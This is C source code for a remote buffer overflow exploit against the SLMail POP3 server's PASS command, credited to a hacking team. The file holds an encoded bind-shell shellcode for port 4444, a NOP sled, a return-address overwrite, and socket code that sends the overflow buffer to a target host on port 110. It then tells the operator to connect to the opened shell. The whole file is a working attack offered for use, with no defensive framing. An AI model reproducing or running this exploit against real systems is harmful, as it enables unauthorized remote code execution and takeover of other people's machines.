/*
SLMAIL REMOTE PASSWD BOF - Ivan Ivanovic Ivanov ????-?????
???????????????? 31337 Team
*/

#include <string.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

// [*] bind 4444 
unsigned char shellcode[] =
"\xba\x74\x2b\x36\x95\xdb\xd5\xd9\x74\x24\xf4\x5d\x29\xc9\xb1"
"\x52\x31\x55\x12\x83\xed\xfc\x03\x21\x25\xd4\x60\x35\xd1\x9a"
"\x8b\xc5\x22\xfb\x02\x20\x13\x3b\x70\x21\x04\x8b\xf2\x67\xa9"
"\x60\x56\x93\x3a\x04\x7f\x94\x8b\xa3\x59\x9b\x0c\x9f\x9a\xba"
"\x8e\xe2\xce\x1c\xae\x2c\x03\x5d\xf7\x51\xee\x0f\xa0\x1e\x5d"
"\xbf\xc5\x6b\x5e\x34\x95\x7a\xe6\xa9\x6e\x7c\xc7\x7c\xe4\x27"
"\xc7\x7f\x29\x5c\x4e\x67\x2e\x59\x18\x1c\x84\x15\x9b\xf4\xd4"
"\xd6\x30\x39\xd9\x24\x48\x7e\xde\xd6\x3f\x76\x1c\x6a\x38\x4d"
"\x5e\xb0\xcd\x55\xf8\x33\x75\xb1\xf8\x90\xe0\x32\xf6\x5d\x66"
"\x1c\x1b\x63\xab\x17\x27\xe8\x4a\xf7\xa1\xaa\x68\xd3\xea\x69"
"\x10\x42\x57\xdf\x2d\x94\x38\x80\x8b\xdf\xd5\xd5\xa1\x82\xb1"
"\x1a\x88\x3c\x42\x35\x9b\x4f\x70\x9a\x37\xc7\x38\x53\x9e\x10"
"\x3e\x4e\x66\x8e\xc1\x71\x97\x87\x05\x25\xc7\xbf\xac\x46\x8c"
"\x3f\x50\x93\x03\x6f\xfe\x4c\xe4\xdf\xbe\x3c\x8c\x35\x31\x62"
"\xac\x36\x9b\x0b\x47\xcd\x4c\xf4\x30\xe7\x7e\x9c\x42\xf7\x7f"
"\xe6\xca\x11\x15\x08\x9b\x8a\x82\xb1\x86\x40\x32\x3d\x1d\x2d"
"\x74\xb5\x92\xd2\x3b\x3e\xde\xc0\xac\xce\x95\xba\x7b\xd0\x03"
"\xd2\xe0\x43\xc8\x22\x6e\x78\x47\x75\x27\x4e\x9e\x13\xd5\xe9"
"\x08\x01\x24\x6f\x72\x81\xf3\x4c\x7d\x08\x71\xe8\x59\x1a\x4f"
"\xf1\xe5\x4e\x1f\xa4\xb3\x38\xd9\x1e\x72\x92\xb3\xcd\xdc\x72"
"\x45\x3e\xdf\x04\x4a\x6b\xa9\xe8\xfb\xc2\xec\x17\x33\x83\xf8"
"\x60\x29\x33\x06\xbb\xe9\x43\x4d\xe1\x58\xcc\x08\x70\xd9\x91"
"\xaa\xaf\x1e\xac\x28\x45\xdf\x4b\x30\x2c\xda\x10\xf6\xdd\x96"
"\x09\x93\xe1\x05\x29\xb6"; 
void exploit(int sock) {
      FILE *test;
      int *ptr;
      char userbuf[] = "USER madivan\r\n";
      char evil[3001];
      char buf[3012];
      char receive[1024];
      char nopsled[] = "\x90\x90\x90\x90\x90\x90\x90\x90"
                       "\x90\x90\x90\x90\x90\x90\x90\x90";
      memset(buf, 0x00, 3012);
      memset(evil, 0x00, 3001);
      memset(evil, 0x43, 3000);
      ptr = &evil;
      ptr = ptr + 652; // 2608 
      memcpy(ptr, &nopsled, 16);
      ptr = ptr + 4;
      memcpy(ptr, &shellcode, 317);
      *(long*)&evil[2600] = 0x8f354a5f; // JMP ESP XP 7CB41020 FFE4 JMP ESP

      // banner
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // user
      printf("[+] Sending Username...\n");
      send(sock, userbuf, strlen(userbuf), 0);
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // passwd
      printf("[+] Sending Evil buffer...\n");
      sprintf(buf, "PASS %s\r\n", evil);
      //test = fopen("test.txt", "w");
      //fprintf(test, "%s", buf);
      //fclose(test);
      send(sock, buf, strlen(buf), 0);
      printf("[*] Done! Connect to the host on port 4444...\n\n");
}

int connect_target(char *host, u_short port)
{
    int sock = 0;
    struct hostent *hp;
    WSADATA wsa;
    struct sockaddr_in sa;

    WSAStartup(MAKEWORD(2,0), &wsa);
    memset(&sa, 0, sizeof(sa));

    hp = gethostbyname(host);
    if (hp == NULL) {
        printf("gethostbyname() error!\n"); exit(0);
    }
    printf("[+] Connecting to %s\n", host);
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr = **((struct in_addr **) hp->h_addr_list);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)      {
        printf("[-] socket blah?\n");
        exit(0);
        }
    if (connect(sock, (struct sockaddr *) &sa, sizeof(sa)) < 0)
        {printf("[-] connect() blah!\n");
        exit(0);
          }
    printf("[+] Connected to %s\n", host);
    return sock;
}


int main(int argc, char **argv)
{
    int sock = 0;
    int data, port;
    printf("\n[$] SLMail Server POP3 PASSWD Buffer Overflow exploit\n");
    printf("[$] by Mad Ivan [ void31337 team ] - http://exploit.void31337.ru\n\n");
    if ( argc < 2 ) { printf("usage: slmail-ex.exe <host> \n\n"); exit(0); }
    port = 110;
    sock = connect_target(argv[1], port);
    exploit(sock);
    closesocket(sock);
    return 0;
}
